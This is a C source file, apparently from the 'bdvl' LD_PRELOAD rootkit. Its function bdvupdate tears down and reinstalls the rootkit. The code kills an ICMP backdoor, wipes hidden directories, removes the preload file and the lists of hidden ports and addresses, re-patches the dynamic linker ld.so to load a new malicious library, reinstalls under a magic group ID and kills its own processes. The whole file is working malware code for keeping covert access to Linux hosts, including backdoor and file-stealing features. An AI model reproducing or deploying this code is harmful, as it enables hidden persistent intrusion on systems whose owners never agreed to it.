/* uninstall current installation.
 * install new installation.
 *
 * this function is similar to bdvuninstall however there are a few minor differences.
 *   1. ld.so is not reverted, it is patched again to read from the new PRELOAD_FILE.
 *   2. HOMEDIR is not removed until the end if calling process (you) are in it installing bdvl.
 *   3. and of course..we reinstall with our new version at the very end.  */
void bdvupdate(char *const argv[]){
    int gotso=0;
    for(int i = 2; argv[i] != NULL; i++){
        if(strstr(argv[i], ".so."))
            gotso=1;
        else gotso=0;
    }
    if(!gotso){
        printf("No target .so(s)\n");
        return;
    }

    printf("\nAbout to begin update...\n");
    printf("  Everything from this current installation will be removed.\n");
    printf("  So make sure you've saved stuff you wanna see again.\n");
    printf("  Enter all settings as they are in the \e[1;31mnew\e[0m configuration.\n");
    printf("Press enter to continue, ^C to cancel.");
    getchar();

    /* get settings for new install. */
    char installdir[PATH_MAX], preloadpath[PATH_MAX], bdvlso[256], mgid[64];

    gid_t magicgid;
    printf("\n\e[1;31mINSTALL_DIR:\e[0m ");
    fgets(installdir, sizeof(installdir), stdin);
    installdir[strlen(installdir)-1]='\0';
    
    printf("\e[1;31mOLD_PRELOAD / PRELOAD_FILE (PATCH_DYNAMIC_LINKER?):\e[0m ");
    fgets(preloadpath, sizeof(preloadpath), stdin);
    preloadpath[strlen(preloadpath)-1]='\0';

    printf("\e[1;31mBDVLSO:\e[0m ");
    fgets(bdvlso, sizeof(bdvlso), stdin);
    bdvlso[strlen(bdvlso)-1]='\0';

    printf("\e[1;31mMAGIC_GID:\e[0m ");
    fgets(mgid, sizeof(mgid), stdin);
    mgid[strlen(mgid)-1]='\0';
    sscanf(mgid, "%u", &magicgid);

    printf("\n\e[1;31mARE THESE 100%% CORRECT?\e[0m (ENTER = yes, ^C = cancel)");
    getchar();

    /* kill icmp backdoor & remove old INSTALL_DIR & HOMEDIR. */
    printf("\nRemoving previous installation...\n");
#ifdef USE_ICMP_BD
    if(pdoorup()){
        printf("Killing ICMP backdoor\n");
        killrkprocs(readgid()-1);
    }
#endif
    printf("Eradicating directories\n");
    eradicatedir(INSTALL_DIR);

    int inhome=0; // installing new bdvl from homedir?
    char *cwd = getcwd(NULL, 0);
    if(cwd != NULL){
        if(strncmp(HOMEDIR, cwd, strlen(HOMEDIR)))
            eradicatedir(HOMEDIR);
        else inhome=1;
        free(cwd);
    }else eradicatedir(HOMEDIR);

    char *curpreload = OLD_PRELOAD;
#ifdef PATCH_DYNAMIC_LINKER
    curpreload = PRELOAD_FILE;
#endif
    printf("Removing preload file\n");
    if(rm(curpreload) < 0)
        printf("Failed removing preload file\n");

    printf("Removing bdvl paths\n");
    rmbdvpaths();

#if defined FILE_STEAL && defined CLEANEDTIME_PATH
    if(rm(CLEANEDTIME_PATH) < 0)
        printf("Failed removing CLEANEDTIME_PATH\n");
#endif
#ifdef HIDE_PORTS
    if(rm(HIDEPORTS) < 0)
        printf("Failed removing hide_ports\n");
#endif
#ifdef HIDE_ADDRS
    if(rm(HIDEADDRS) < 0)
        printf("Failed removing hide_addrs\n");
#endif

#ifdef UNINSTALL_MY_ASS
    printf("Uninstalling your ass\n");
    uninstallass();
#endif
#ifdef PATCH_DYNAMIC_LINKER
    printf("Patching ld.so\n");
    ldpatch(curpreload, preloadpath);
#endif

    bdvinstall(argv, installdir, bdvlso, preloadpath, magicgid);

    // now we can eradicate...
    if(inhome) eradicatedir(HOMEDIR);
    printf("\nDONE! RECONNECT!!\n");
    hook(CKILL);
    call(CKILL, getppid(), SIGKILL);
    call(CKILL, getpid(), SIGKILL);
}